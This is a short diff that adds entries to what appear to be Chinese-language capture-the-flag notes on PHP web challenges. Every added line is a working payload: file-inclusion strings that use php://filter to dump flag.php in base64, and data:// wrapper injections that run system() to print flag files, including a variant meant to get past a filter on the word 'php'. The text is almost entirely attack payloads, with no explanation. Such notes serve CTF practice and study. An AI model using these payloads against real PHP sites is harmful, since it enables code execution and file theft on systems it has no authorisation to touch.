@@ -29,7 +29,17 @@
 
 <br>
 
+直接传参时
+
 * c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+* c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
+* c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+
+当include(c)时：
+* c=data://text/plain,<?php system('tac f*');?>
+* php被过滤的时候
+* ?c=data://text/plain,<?=system("tac fla*")?>
+
 
 <br>
 
